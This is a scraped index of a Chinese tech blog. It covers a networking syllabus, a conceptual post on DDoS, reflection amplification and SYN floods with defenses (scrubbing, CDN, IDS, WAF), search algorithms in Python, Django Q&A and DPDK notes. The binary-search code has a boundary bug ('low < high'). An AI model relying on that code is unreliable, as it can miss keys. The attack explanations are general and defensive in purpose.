2.1.2 奈氏准则和香农定理 2.1.3 编码与调制\n2.2 传输介质及物理设备 2.2.1 传输介质（双绞线、同轴电缆、光纤、无线电缆、微波、激光、红外线） 2.2.2 物理层设备（中继器、集线器）\n2.0.0 物理层总结\n第 3 章 数据链路层 https://info.support.huawei.com/info-finder/encyclopedia/zh/MTU.html\n3.1 数据链路层的功能 3.1.1 数据链路层的基本概念和功能概述\n3.2 组帧 3.2.1 封装成帧、帧定界、帧同步、透明传输（字符计数法、字符串的首尾填充法、零比特填充的首尾标志法、违规编码法\n3.3 差错控制 3.3.1 数据链路层之差错控制（检错编码和纠错编码）-\u0026gt;（奇偶校验码、CRC循环冗余码、海明码）\n3.4 流量控制与可靠传输机制 3.4.1 流量控制（停止-等待协议、滑动窗口、后退N帧协议GBN、选择重传协议SR）、滑动窗口、可靠传输机制\n3.5 介质访问控制 3.5.1 介质访问控制（静态划分信道、FDM、TDM、STDM、WDM、CDM）、（动态划分信道、ALOHA、CSMA、CSMA/CD、CSMA/CA）、令牌传递协议\n3.6 局域网 3.6.1 局域网（以太网与IEEE 802.3、IEEE 802.11、）\n3.7 广域网 3.7.1 广域网（ppp协议、HDLC协议）\n3.8 数据链路层设备 3.8.1 数据链路层设备（网桥、交换机）\n第 4 章 网络层 4.1 网络层的功能 4.1.1 网络层的功能（路由选择与分组转发、异构网络互连、拥塞控制） 4.1.2 计算机网络之（电路交换、报文交换、分组交换–数据报–虚电路）\n4.2 路由算法与路由协议概述 4.2.1 路由算法与路由协议概述（静态路由和动态路由—距离-向量路由算法—链路状态路由算法、层次路由）\n4.3 IPv4 4.3.1 IPv4（IPv4分组、IPv4地址、NAT、子网划分与子网掩码、CIDR、ARP协议、DHCP、ICMP）\n4.4 IPv6 4.4.1 IPv6(诞生原因、数据报格式、与IPv4的不同、地址表现形式、基本地址类型、IPv6与IPv4的过渡策略)\n4.5 路由协议 4.5.1 路由选择协议（自治系统AS、RIP、OSPF、BGP）\n4.6 IP组播 4.6.1 IP组播（IGMP、组播路由选择协议、组播地址）\n4.7 移动IP 4.7.1 移动IP\n4.8 路由器 4.8.1 网络层设备路由器\n第 5 章 传输层 5.1 传输层提供的服务 5.1.1 （传输层提供的服务及功能概述、端口、套接字–Socket、无连接UDP和面向连接TCP服务）\n5.2 UDP协议 5.2.1 UDP协议\n5.3 TCP协议 5.3.1 TCP协议（tcp协议特点、tcp报文段首部格式、tcp连接管理—三次握手、tcp连接释放—四次握手） 5.3.2 TCP可靠传输 5.3.3 TCP流量控制 5.3.4 TCP拥塞控制(慢开始与拥塞避免、快重传和快恢复)\n第 6 章 应用层 6.1 网络应用模型 6.1.1 应用层概述(C/S模型与p2p模型)\n6.2 域名系统DNS 6.2.1 详解DNS域名解析系统（域名、域名服务器[根、顶级、授权/权限、本地]、域名解析过程[递归与迭代]）\n6.3 FTP协议 ​ 6.3.1 FTP协议\n6.4 电子邮件系统的组成和结构 ​ 6.4.1 你真的了解电子邮件系统的组成和结构吗？（SMTP、POP3、IMAP、MIME……）\n6.5 万维网与HTTP ​ 6.5.1 万维网www与HTTP协议\n","permalink":"https://kevinerr.github.io/posts/tech/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","summary":"https://blog.csdn.net/weixin_43914604/article/details/104722679 第1 章 计算机网络体系结构 1.1 计算机网络概述 1.1.1 计算机网络的概念、组成、功能和分类 1.1.2 计算机网络的性能指标（速率、带宽、吞吐量、时延、往返时延、时","title":"计算机网络"},{"content":"DDos https://www.zhihu.com/question/22259175\n概念 Distributed Denial of Service，翻译成中文就是分布式拒绝服务\n一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。在线游戏、互联网金融等领域是 DDoS 攻击的高发行业。\n举例\n我开了一家有五十个座位的重庆火锅店，由于用料上等，童叟无欺。平时门庭若市，生意特别红火，而对面二狗家的火锅店却无人问津。二狗为了对付我，想了一个办法，叫了五十个人来我的火锅店坐着却不点菜，让别的客人无法吃饭。\nDoS 拒绝服务\nDDoS 分布式拒绝服务\nDRDoS 分布式反射拒绝服务\nCC Challenge Collapsar\n0X1 A比B大，于是分出一部分资源，不停的对B网吧发起FLOOD攻击。导致A损失一部分资源，B关门了。 这就是DoS攻击。\n0X2 A比B小。但是A有很多兄弟C,D,E,F,G网吧，甚至A还控制了一些肉鸡。一起对B发起FLOOD攻击。B又关门了。这就是DDoS攻击。\n0X3 B很大，A和他的朋友打不动了。于是他们找到了很多公网提供的服务。如redis、mongodb、memcache、NTP、UPnP\u0026hellip;.. 然后一起对这些服务发送伪造的请求。如：Hi memcache，请把缓存的数据发给我。我的IP是B。（放大了几百倍） 这种攻击叫反射攻击。于是大量的反射攻击开始了。 全球几十万的弱验证开放服务一起给B发送数据。B又关门了。这就是DRDoS。\n0X4 B很生气，于是在运营商层面部署了很多硬防来清洗流量。 DDoS DRDoS 也没办法了。这时候A突然发现B有一个数据查询接口，部署在公网。如：会员信息查询之类的。A又联合他的兄弟，甚至找了很多公开的免费代理。一起对这个接口进行请求。每秒几十万次查询。最终B的会员数据库挂了。B又关门了。这就是CC攻击。\n最后B报警，把A抓起来了。。\n类型 ICMP Flood\nICMP（Internet控制报文协议）用于在IP主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息，虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。通过对目标系统发送海量数据包，就可以令目标主机瘫痪，如果大量发送就成了洪水攻击。\nUDP Flood\nUDP协议是一种无连接的服务，在UDP Flood 中，攻击者通常发送大量伪造源IP地址的小UDP包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。100k bps的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。\n上述传统的流量型攻击方式技术含量较低，伤人一千自损八百，攻击效果通常依赖受控主机本身的网络性能，而且容易被查到攻击源头，单独使用的情况已不常见。于是，具有四两拔千斤效果的反射型放大攻击就出现了。\nNTP Flood\nNTP是标准的基于UDP协议传输的网络时间同步协议，由于UDP协议的无连接性，方便伪造源地址。攻击者使用特殊的数据包，也就是IP地址指向作为反射器的服务器，源IP地址被伪造成攻击目标的IP，反射器接收到数据包时就被骗了，会将响应数据发送给被攻击目标，耗尽目标网络的带宽资源。一般的NTP服务器都有很大的带宽，攻击者可能只需要1Mbps的上传带宽欺骗NTP服务器，就可给目标服务器带来几百上千Mbps的攻击流量。\n因此，“问-答”方式的协议都可以被反射型攻击利用，将质询数据包的地址伪造为攻击目标地址，应答的数据包就会都被发送至目标，一旦协议具有递归效果，流量就被显著放大了，堪称一种“借刀杀人”的流量型攻击。\nSYN Flood\n这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。建立TCP连接，需要三次握手——客户端发送SYN报文，服务端收到请求并返回报文表示接受，客户端也返回确认，完成连接。\nSYN Flood 就是用户向服务器发送报文后突然死机或掉线，那么服务器在发出应答报文后就无法收到客户端的确认报文（第三次握手无法完成），这时服务器端一般会重试并等待一段时间后再丢弃这个未完成的连接。一个用户出现异常导致服务器的一个线程等待一会儿并不是大问题，但恶意攻击者大量模拟这种情况，服务器端为了维护数以万计的半连接而消耗非常多的资源，结果往往是无暇理睬客户的正常请求，甚至崩溃。从正常客户的角度看来，网站失去了响应，无法访问。\nCC 攻击\nDNS Query Flood\n混合攻击\n如何应对 DDoS 攻击？ 高防服务器\n还是拿我开的重庆火锅店举例，高防服务器就是我给重庆火锅店增加了两名保安，这两名保安可以让保护店铺不受流氓骚扰，并且还会定期在店铺周围巡逻防止流氓骚扰。\n高防服务器主要是指能独立硬防御 50Gbps 以上的服务器，能够帮助网站拒绝服务攻击，定期扫描网络主节点等，这东西是不错，就是贵\n黑名单\n面对火锅店里面的流氓，我一怒之下将他们拍照入档，并禁止他们踏入店铺，但是有的时候遇到长得像的人也会禁止他进入店铺。这个就是设置黑名单，此方法秉承的就是“错杀一千，也不放一百”的原则，会封锁正常流量，影响到正常业务。\nDDoS 清洗\nDDos 清洗，就是我发现客人进店几分钟以后，但是一直不点餐，我就把他踢出店里。\nDDoS 清洗会对用户请求数据进行实时监控，及时发现DOS攻击等异常流量，在不影响正常业务开展的情况下清洗掉这些异常流量。\nCDN 加速\nCDN 加速，我们可以这么理解：为了减少流氓骚扰，我干脆将火锅店开到了线上，承接外卖服务，这样流氓找不到店在哪里，也耍不来流氓了。\n在现实中，CDN 服务将网站访问流量分配到了各个节点中，这样一方面隐藏网站的真实 IP，另一方面即使遭遇 DDoS 攻击，也可以将流量分散到各个节点中，防止源站崩溃。\nIDS 入侵检测系统（intrusion detection system，简称“IDS”）是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。 IDS最早出现在1980年4月。 1980年代中期，IDS逐渐发展成为入侵检测专家系统（IDES）。 1990年，IDS分化为基于网络的IDS和基于主机的IDS。后又出现分布式IDS。目前，IDS发展迅速，已有人宣称IDS可以完全取代防火墙。\n目前入侵检测系统研究的主流方向大都以提升异常检测的准确性或提高攻击行为特征提取的速率上。\n准确性：使用机器学习算法或网络算法实现的、大数据相关技术\nDPDK 高性能高速率包捕获框架\n入侵检测系统中极其重要的一环就是对数据包的处理进而通过分析数据包来做出相应的反馈\n目前比较流行的数据包处理技术主要有 Libpcap，PF_RING，Netmap 和 DPDK 等\nLibpcap工作原理中，必须使用网卡的硬中断做通讯，每次硬中断大约消耗 100 微秒，中断会带来上下文的切换，从而会造成不同类型的 cache miss 和内核态用户态之间切换，一旦发生 cache miss，速度就会下降，而内核态和用户态的切换又发生数据拷贝，增加 CPU 以及内存的消耗。\nPF_RING是 Luca Deri 研究出来的用来提高内核处理数据包效率的数据包捕获函数库。\n使用 NAPI 减少 CPU 中断响应网卡的技术。NAPI的基本思想就是当数据包到来时网卡发出中断请求，CPU 响应中断请求进入中断处理程序，同时 CPU 会关闭接下来的中断处理请求。因为在 CPU 进入中断处理程序后，会使用轮询的方式获取数据包，轮询持续到接收了一定数量的数据包以后再退出，并打开中断。通过这种方式减少 CPU 中断次数。 (2) 使用 mmap 和 DMA 实现零拷贝减少数据在内存之间的拷贝。数据由 DMA从网卡直接拷贝到内核空间后，应用程序可以在用户态的内存空间中通过 mmap 直接访问内核数据从而减少内存数据在内核态空间和用户态空间的拷贝。\nNetmap 也是一个基于零拷贝的高性能的数据包收发框架\n(1)花费在系统调用以及处理数据包的时间少。 (2) 利用自带的网卡驱动直接接管网卡，运行时会申请一块固定的内存池，用于 存储接收网卡的数据包和需要发送给网卡的数据包。 (3) 使用 mmap 减少内存拷贝。\nDPDK\n相比于 Libpcap 过多的内核和系统操作，PF_RING 中无法避免的内核处理等，Netmap 中支持该驱动的网卡较少等问题有更大的优势\n防火墙 （Firewall） 别名防护墙，于1993发明并引入国际互联网。\n他是一项信息安全的防护系统，依照特定的规则，允许或是限制传输的数据通过。在网络中，所谓的防火墙是指一种将内网和外网分开的方法，他实际上是一种隔离技术\n防火墙对流经它的网络通信进行扫描， 这样就能够过滤掉一些攻击，以免其在目标计算机上执行。\n通常的防火墙主要工作第二到第四层，重心是在网络层，用于过滤IP和协议类型。\nWAF (Web Application Firewall) Web应用防火墙\nWeb应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略还专门为Web应用提供保护的一款产品。\n与传统防火钱不同，WAF工作在应用层。\n","permalink":"https://kevinerr.github.io/posts/tech/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/","summary":"DDos https://www.zhihu.com/question/22259175 概念 Distributed Denial of Service，翻译成中文就是分布式拒绝服务 一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标","title":"信息安全"},{"content":"顺序搜索 顺序查找又称为线性查找，是一种最简单的查找方法。适用于线性表的顺序存储结构和链式存储结构。该算法的时间复杂度为O(n)。\n从第一个元素m开始逐个与需要查找的元素x进行比较，当比较到元素值相同(即m=x)时返回元素m的下标，如果比较到最后都没有找到，则返回-1。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # 最基础的遍历无序列表的查找算法 # 时间复杂度O(n)  def sequential_search(lis, key):  length = len(lis)  for i in range(length):  if lis[i] == key:  return i  else:  return False  if __name__ == \u0026#39;__main__\u0026#39;:  LIST = [1, 5, 8, 123, 22, 54, 7, 99, 300, 222]  result = sequential_search(LIST, 123)  print(result)   二分查找 二分查找（Binary Search），是一种在有序数组中查找某一特定元素的查找算法。查找过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则查找过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # 针对有序查找表的二分查找算法  def binary_search(lis, key):  low = 0  high = len(lis) - 1  time = 0  while low \u0026lt; high:  time += 1  mid = int((low + high) / 2)  if key \u0026lt; lis[mid]:  high = mid - 1  elif key \u0026gt; lis[mid]:  low = mid + 1  else:  # 打印折半的次数  print(\u0026#34;times: %s\u0026#34; % time)  return mid  print(\u0026#34;times: %s\u0026#34; % time)  return False  if __name__ == \u0026#39;__main__\u0026#39;:  LIST = [1, 5, 7, 8, 22, 54, 99, 123, 200, 222, 444]  result = binary_search(LIST, 99)  print(result)   二叉树 二叉查找树是先对待查找的数据进行生成树，确保树的左分支的值小于右分支的值，然后在就行和每个节点的父节点比较大小，查找最适合的范围。 这个算法的查找效率很高，但是如果使用这种查找方法要首先创建树。\n二叉查找树性质：对二叉查找树进行中序遍历，即可得到有序的数列\n2-3查找树（2-3 Tree） 和二叉树不一样，2-3树运行每个节点保存1个或者两个的值。对于普通的2节点(2-node)，他保存1个key和左右两个自己点。对应3节点(3-node)，保存两个Key，2-3查找树的定义如下： 1）要么为空，要么： 2）对于2节点，该节点保存一个key及对应value，以及两个指向左右节点的节点，左节点也是一个2-3节点，所有的值都比key要小，右节点也是一个2-3节点，所有的值比key要大。 3）对于3节点，该节点保存两个key及对应value，以及三个指向左中右的节点。左节点也是一个2-3节点，所有的值均比两个key中的最小的key还要小；中间节点也是一个2-3节点，中间节点的key值在两个跟节点key值之间；右节点也是一个2-3节点，节点的所有key值比两个key中的最大的key还要大。\n平衡二叉树 对二叉排序树加以约束，要求每个结点的左右两个子树的高度差的绝对值不超过1，这样的二叉树称为平衡二叉树，同时要求每个结点的左右子树都是平衡二叉树，这样，就不会因为一边的疯狂增加导致失衡。\n失衡情况包括以下四种：\n左左失衡：通过右旋进行调整。\n右右失衡：通过左旋进行调整。\n左右失衡：先进行左旋，再进行右旋来调整。\n右左失衡：先进行右旋，再进行左旋来调整。\n红黑树（Red-Black Tree） https://blog.csdn.net/weixin_47365232/article/details/124367337\n有了平衡二叉树，为什么还需要红黑树？\n1、AVL的左右子树高度差不能超过1，每次进行插入、删除操作时，几乎都需要通过旋转操作保持平衡。 2、在频繁进行插入/删除的场景中，频繁的旋转操作使得AVL的性能大打折扣。 3、红黑树通过牺牲严格的平衡，换取插入/删除时少量的旋转操作，整体性能优于AVL。红黑树插入时的不平衡，不超过两次旋转就可以解决；删除时的不平衡，不超过三次旋转就能解决。\n红黑树的特性: （1）每个节点或者是黑色，或者是红色。（非黑即红） （2）根节点是黑色。 （3）每个叶子节点都是黑色的空节点（NIL节点）。 （4）如果一个节点是红色的，则它的子节点必须是黑色的。(根到叶子的所有路径不可能存在两个连续的红色节点) （5）从一个节点到该节点的叶子节点的所有路径上包含相同数目的黑节点。（相同的黑色高度）\n约束4和5，保证了红黑树的大致平衡：根到叶子的所有路径中，最长路径不会超过最短路径的2倍。\n插入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  基本的插入规则和平衡二叉树一样，但是在插入后： 1. 将新插入的节点标记为红色。  情况1：父节点是黑色节点，直接插入，无需任何操作调整（不会打破上述规则）  情况2：插入的节点为根结点，则标记为黑色。  情况3：父节点是红色节点，需要调整（打破规则4）。  ①叔节点为红色（叔父同色） \t①.1 将叔节点、父节点都标记为黑色 \t①.2 祖父节点标记为红色 \t①.3 然后把祖父节点当作插入节点进行分析  ②叔节点为黑色（叔父异色）   要分四种情况处理  a.左左 (父节点是祖父节点的左孩子，并且插入节点是父节点的左孩子)  进行右旋操作  b.左右 (父节点是祖父节点的左孩子，并且插入节点是父节点的右孩子)  进行左旋、再进行右旋操作  c.右右 (父节点是祖父节点的右孩子，并且插入节点是父节点的右孩子)  进行左旋操作  d.右左 (父节点是祖父节点的右孩子，并且插入节点是父节点的左孩子)  进行右旋、再进行左旋操作  其实这种情况下处理就和的平衡二叉树一样。   最后还是对于祖父节点重新进行分析。   B树 B 树可以看作是对2-3查找树的一种扩展，即他允许每个节点有M-1个子节点。 ①根节点至少有两个子节点； ②每个节点有M-1个key，并且以升序排列； ③位于M-1和M key的子节点的值位于M-1 和M key对应的Value之间； ④非叶子结点的关键字个数=指向儿子的指针个数-1； ⑤非叶子结点的关键字：K[1], K[2], …, K[M-1]；且K[i] ； ⑥其它节点至少有M/2个子节点； ⑦所有叶子结点位于同一层； 如：（M=3）\n1.关键字集合分布在整颗树中； 2.任何一个关键字出现且只出现在一个结点中； 3.搜索有可能在非叶子结点结束； 4.其搜索性能等价于在关键字全集内做一次二分查找； 5.自动层次控制； 由于限制了除根结点以外的非叶子结点，至少含有M/2个儿子，确保了结点的至少利用率，其最底搜索性能为O(LogN)\nB+树 B+树是B-树的变体，也是一种多路搜索树： 1.其定义基本与B-树同，除了： 2.非叶子结点的子树指针与关键字个数相同； 3.非叶子结点的子树指针P[i]，指向关键字值属于[K[i], K[i+1])的子树 4.B-树是开区间； 5.为所有叶子结点增加一个链指针； 6.所有关键字都在叶子结点出现；\n如：（M=3）\nB+树的特性\n1.所有关键字都出现在叶子结点的链表中（稠密索引），且链表中的关键字恰好是有序的； 2.不可能在非叶子结点命中； 3.非叶子结点相当于是叶子结点的索引（稀疏索引），叶子结点相当于是存储（关键字）数据的数据层； 4.更适合文件索引系统；\n文件系统和数据库系统\n分块查找 算法简介\n要求是顺序表，分块查找又称索引顺序查找，它是顺序查找的一种改进方法。\n算法思想\n**将n个数据元素\u0026quot;按块有序\u0026quot;划分为m块（m ≤ n）。 ** **每一块中的结点不必有序，但块与块之间必须\u0026quot;按块有序\u0026quot;； ** **即第1块中任一元素的关键字都必须小于第2块中任一元素的关键字； ** 而第2块中任一元素又都必须小于第3块中的任一元素，……\n哈希查找 算法简介\n哈希表就是一种以键-值(key-indexed) 存储数据的结构，只要输入待查找的值即key，即可查找到其对应的值。\n算法思想\n哈希的思路很简单，如果所有的键都是整数，那么就可以使用一个简单的无序数组来实现：将键作为索引，值即为其对应的值，这样就可以快速访问任意键的值。这是对于简单的键的情况，我们将其扩展到可以处理更加复杂的类型的键。\n算法流程\n　1）用给定的哈希函数构造哈希表； 2）根据选择的冲突处理方法解决地址冲突； 常见的解决冲突的方法：拉链法和线性探测法。 3）在哈希表的基础上执行哈希查找。\n倒排索引 搜索引擎对文章进行分词后，再根据关键词建立倒排索引\n但是 Lucene 还是一个库，必须要懂一点搜索引擎原理的人才能用的好，所以后来又有人基于 Lucene 进行封装，写出了 Elasticsearch。\nhttps://zhuanlan.zhihu.com/p/62892586?utm_source=qq\u0026amp;utm_medium=social\u0026amp;utm_oi=1204428378759098368\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E6%90%9C%E7%B4%A0/","summary":"顺序搜索 顺序查找又称为线性查找，是一种最简单的查找方法。适用于线性表的顺序存储结构和链式存储结构。该算法的时间复杂度为O(n)。 从第一个元素","title":"搜素"},{"content":"什么是wsgi？ WSGI是Python在处理HTTP请求时，规定的一种处理方式。如一个HTTP Request过来了，那么就有一个相应的处理函数来进行处理和返回结果。WSGI就是规定这个处理函数的参数长啥样的，它的返回结果是长啥样的？至于该处理函数的名子和处理逻辑是啥样的，那无所谓。简单而言，WSGI就是规定了处理函数的输入和输出格式。\ndjango请求的生命周期？  当用户在浏览器中输入url时,浏览器会生成请求头和请求体发给服务端 请求头和请求体中会包含浏览器的动作(action),这个动作通常为get或者post,体现在url之中. url经过Django中的wsgi,再经过Django的中间件,最后url到过路由映射表,在路由中一条一条进行匹配, 一旦其中一条匹配成功就执行对应的视图函数,后面的路由就不再继续匹配了. 视图函数根据客户端的请求查询相应的数据.返回给Django,然后Django把客户端想要的数据做为一个字符串返回给客户端. 客户端浏览器接收到返回的数据,经过渲染后显示给用户.  Django本身提供了runserver，为什么不能用来部署？(runserver与uWSGI的区别)  1.runserver方法是调试 Django 时经常用到的运行方式，它使用Django自带的 WSGI Server 运行，主要在测试和开发中使用，并且 runserver 开启的方式也是单进程 。 2.uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http 等协议。注意uwsgi是一种通信协议，而uWSGI是实现uwsgi协议和WSGI协议的 Web 服务器。uWSGI具有超快的性能、低内存占用和多app管理等优点，并且搭配着Nginx就是一个生产环境了，能够将用户访问请求与应用 app 隔离开，实现真正的部署 。相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。  Django如何实现websocket？  django实现websocket官方推荐大家使用channels。channels通过升级http协议 升级到websocket协议。保证实时通讯。也就是说，我们完全可以用channels实现我们的即时通讯。而不是使用长轮询和计时器方式来保证伪实时通讯。他通过改造django框架，使django既支持http协议又支持websocket协议。 官方文档地址：https://channels.readthedocs.io/en/stable/  ","permalink":"https://kevinerr.github.io/posts/tech/django/","summary":"什么是wsgi？ WSGI是Python在处理HTTP请求时，规定的一种处理方式。如一个HTTP Request过来了，那么就有一个相应的处理函","title":"Django"},{"content":"前置知识 网卡(Network Interface Card，简称NIC)\nhttps://blog.csdn.net/hellozhxy/article/details/120711251\nUIO （Linux Userspace I/O）\n作用\n作为高并发大流量网络开发框架的DPDK，能够避免内核中断爆炸和大量数据拷贝的方 法，在用户空间能够直接和硬件进行交互。\n原理\n将硬件操作映射到用户空间的kernel bypass方案\n实现\n1.开发运行在内核的UIO模块，因为硬中断只能在内核处理\n2.read感知中断，通过/dev/uioX读取中断\n3.通过mmap和外设共享内存\n轮询模式驱动（PMD） Polling mode drive\n用户空间驱动使得应用程序不需要经过linux内核就可以访问网络设备卡。网卡设备可以通过DMA方式将数据包传输到事先分配好的缓冲区，这个缓冲区位于用户空间，应用程序通过不断轮询的方式可以读取数据包并在原地址上直接处理，不需要中断，而且也省去了内核到应用层的数据包拷贝过程。\n中断的缺点\n由于linux系统是通过中断的方式告知CPU有数据包过来的，当网络的流量越来越大，linux系统会浪费越来越多的时间去处理中断，当流量速率达到10G的时候，linux系统可能会被中断淹没，浪费很多CPU资源。\n缺点\n因此相对于linux系统传统中断方式，Intel DPDK避免了中断处理、上下文切换、系统调用、数据复制带来的性能上的消耗，大大提升了数据包的处理性能。同时由于Intel DPDK在用户空间就可以开发驱动，与传统的在内核中开发驱动相比，安全系数大大降低。因为内核层权限比较高，操作相对比较危险，可能因为小的代码bug就会导致系统崩溃，需要仔细的开发和广泛的测试。而在应用层则相反，比较安全，且在应用层调试代码要方便的多。\n大页内存 Linux操作系统通过查找TLB来实现快速的虚拟地址到物理地址的转化。由于TLB是一块高速缓冲cache，容量比较小，容易发生没有命中。当没有命中的时候，会触发一个中断，然后会访问内存来刷新页表，这样会造成比较大的时延，降低性能。Linux操作系统的页大小只有4K，所以当应用程序占用的内存比较大的时候，会需要较多的页表，开销比较大，而且容易造成未命中。相比于linux系统的4KB页，Intel DPDK缓冲区管理库提供了Hugepage大页内存，大小有2MB和1GB页面两种，可以得到明显性能的提升，因为采用大页内存的话，可以需要更少的页，从而需要更少的TLB，这样就减少了虚拟页地址到物理页地址的转换时间。‘\nDPDK中的内存管理如图，最下面是连续的物理内存，这些物理内存是由2MB的大页组成，连续的物理内存上面是内存段，内存段之上则是内存区，我们分配的基本单元对象是在内存区中分配的，内存区包含了ring队列，内存池、LPM路由表还有其他一些高性能的关键结构。\nCPU亲和性 CPU的亲和性（CPU affinity），它是多核CPU发展的结果。随着核心的数量越来越多，为了提高程序工作的效率必须使用多线程。但是随着CPU的核心的数目的增长，Linux的核心间的调度和共享内存争用会严重影响性能。利用Intel DPDK的CPU affinity可以将各个线程绑定到不同的cpu，可以省去来回反复调度带来的性能上的消耗。\n在一个多核处理器的机器上，每个CPU核心本身都存在自己的缓存，缓冲区里存放着线程使用的信息。如果线程没有绑定CPU核，那么线程可能被Linux系统调度到其他的CPU上，这样的话，CPU的cache命中率就降低了。利用CPU的affinity技术，一旦线程绑定到某个CPU后，线程就会一直在指定的CPU上运行，操作系统不会将其调度到其他的CPU上，节省了调度的性能消耗，从而提升了程序执行的效率。\n多核轮询模式：多核轮询模式有两种，分别是IO独占式和流水线式。IO独占式是指每个核独立完成数据包的接收、处理和发送过程，核之间相互独立，其优点是其中一个核出现问题时不影响其他核的数据收发。流水线式则采用多核合作的方式处理数据包，数据包的接收、处理和发送由不同的核完成。流水线式适合面向流的数据处理，其优点是可对数据包按照接收的顺序有序进行处理，缺点是当某个环境（例如接收）所涉及的核出现阻塞，则会造成收发中断。\nIO独占式多核轮询模式中每个网卡只分配给一个逻辑核进行处理。每个逻辑核给所接管的网卡分别分配一个发送队列和一个接收队列，并且独立完成数据包的接收、处理和发送的过程，核与核之间相互独立。系统数据包的处理由多个逻辑核同时进行，每个网卡的收发包队列只能由一个逻辑核提供。当数据包进入网卡的硬件缓存区，用户空间提供的网卡驱动通过轮询得知网卡收到数据包，从硬件缓冲区中取出数据包，并将数据包存入逻辑核提供的收包队列中，逻辑核取出收包队列中的数据包进行处理，处理完毕后将数据包存入逻辑核提供的发包队列，然后由网卡驱动取出发往网卡，最终发送到网络中。\nIO独占式多核轮询模式架构图:\n通常使用ifconfig查看网络接口的时候，会显示TX和RX数据，其实很简单：\nRX==receive，接收，从开启到现在接收封包的情况，是下行流量。\nTX==Transmit，发送，从开启到现在发送封包的情况，是上行流量。\n内存池和无锁环形缓存管理 此外Intel DPDK将库和API优化成了无锁，比如无锁队列，可以防止多线程程序发生死锁。然后对缓冲区等数据结构进行了cache对齐。如果没有cache对齐，则可能在内存访问的时候多读写一次内存和cache。\n内存池缓存区的申请和释放采用的是生产者-消费者模式无锁缓存队列进行管理，避免队列中锁的开销，在缓存区的使用过程中提高了缓冲区申请释放的效率。\nkni Kni(Kernel NIC Interface)内核网卡接口，是DPDK平台提供的用于将数据重入内核协议栈的一个组件，其目的是充分运用传统内核协议栈已实现的较稳定的协议处理功能。\nDPDK平台对数据包的处理绕过了内核协议栈，直接交给用户空间处理，而用户空间没有完善的协议处理栈，如果让开发人员在用户空间实现完整独立的协议栈，开发工作是非常复杂的，因此DPDK平台提供了KNI组件，开发人员可以在用户空间实现一些特殊的协议处理功能，再通过KNI重入内核协议栈功能将普通常见的协议交由传统内核协议栈处理。KNI通信机制如下:\n为什么要弄一个kni接口，虽然dpdk的高速转发性能很出色，但是也有自己的一些缺点，比如没有协议栈就是其中一项缺陷，当然也可能当时设计时就将没有将协议栈考虑进去，毕竟协议栈需要将报文转发处理，可能会使处理报文的能力大大降低。\nKNI组件通过创建KNI虚拟接口设备，将数据包经过虚拟接口实现用户空间和内核协议栈间的通信。当网卡接收到数据包时，应用程序通过用户空间驱动将数据包获取到用户空间，KNI组件将需要数据包发送至KNI虚拟接口，由KNI虚拟接口交给内核协议栈处理，处理后若有响应报文，则再交给KNI虚拟接口返回给应用程序。其中发送数据包至内核协议栈以及接收内核协议栈回复的数据包，是由两个不同的逻辑核分别进行处理，不阻塞应用程序让内核协议栈发送数据包或从内核协议栈接收数据包的过程。\nKNI接口实际上是一个虚拟出来的设备，该虚拟设备定义了四个队列，分别是接收队列（rx_q）、发送队列（tx_q）、已分配内存块队列（alloc_q）、待释放内存块队列（free_q）。接收队列用于存放用户空间程序发往KNI虚拟设备的报文，发送队列用于存放内核协议栈要往KNI虚拟设备的报文。已分配内存块队列存放已向内存中申请的内存块，供内核协议栈发送报文时取出使用。待释放内存块队列用于记录KNI虚拟设备从用户空间程序处接收到报文后将不再使用的内存块，然后将该队列中的内存块释放回内存。用户空间程序从网卡接收到报文时，将报文发送给KNI虚拟设备，KNI虚拟设备接收到用户空间程序发来的报文后，交给内核协议栈进行协议解析。发送报文时，原始数据先由内核协议栈进行协议封装，然后将报文发送给KNI虚拟设备，KNI虚拟设备接收到报文后，再将报文发送给用户空间程序。\n如果只想抓取udp数据包的数据，dpdk就只需抓取这一种，arp和icmp等等的数据都原封不动的交给kni处理\nd第一集 d第二集  1 2 3 4 5  configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install  cmake .  dpkg -i *.deb   对网络数据过滤 比如ip地址黑名单\n1、在网卡处拦截，dpdk\n2、在协议栈拦截，iptables（工具、netfilter的实现）、netfilter\n3、应用程序 fd 黑名单\n千万并发，C10K C1000K C10M\n2-6个linux服务器上做不到（传统linux服务器：数据从网卡复制到内核协议栈再从内核协议栈复制到应用程序，需要cpu参与\ndpdk 从网卡中使用DMA的方式从网卡中的数据直接拷贝到内存，不需要cpu参与，零拷贝\n多队列网卡 大页\ndkdp如何支持千万级并发 Linux I/O原理和Zero-copy 如今的网络应用早已从 CPU 密集型转向了 I/O 密集型，网络服务器大多是基于 C-S 模型，也即 客户端 - 服务端 模型，客户端需要和服务端进行大量的网络通信，这也决定了现代网络应用的性能瓶颈：I/O。\n计算机存储器 寄存器、高速缓存、主存和磁盘\n主内存是操作系统进行 I/O 操作的重中之重，绝大部分的工作都是在用户进程和内核的内存缓冲区里完成的，因此我们接下来需要提前学习一些主存的相关原理。\n物理内存 